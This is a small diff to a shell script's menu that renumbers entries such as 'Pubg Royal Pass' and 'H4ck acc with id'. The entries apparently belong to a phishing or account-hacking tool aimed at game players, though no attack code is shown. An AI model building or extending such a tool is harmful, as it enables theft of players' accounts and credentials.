@@ -322,8 +322,8 @@ main_menu() {
 	cat <<- EOF
 ${RED}[${WHITE}01${RED}] Pubg Gun Skin M416
 ${RED}[${WHITE}02${RED}] Pubg Royal Pass
-${RED}[${WHITE}01${RED}] H4ck acc with id
-${RED}[${WHITE}03${RED}] Pubg M416 Glacier
+${RED}[${WHITE}03${RED}] H4ck acc with id
+${RED}[${WHITE}04${RED}] Pubg M416 Glacier
 ${RED}[${WHITE}99${RED}]${ORANGE} About
 ${RED}[${WHITE}00${RED}]${ORANGE} Exit
 
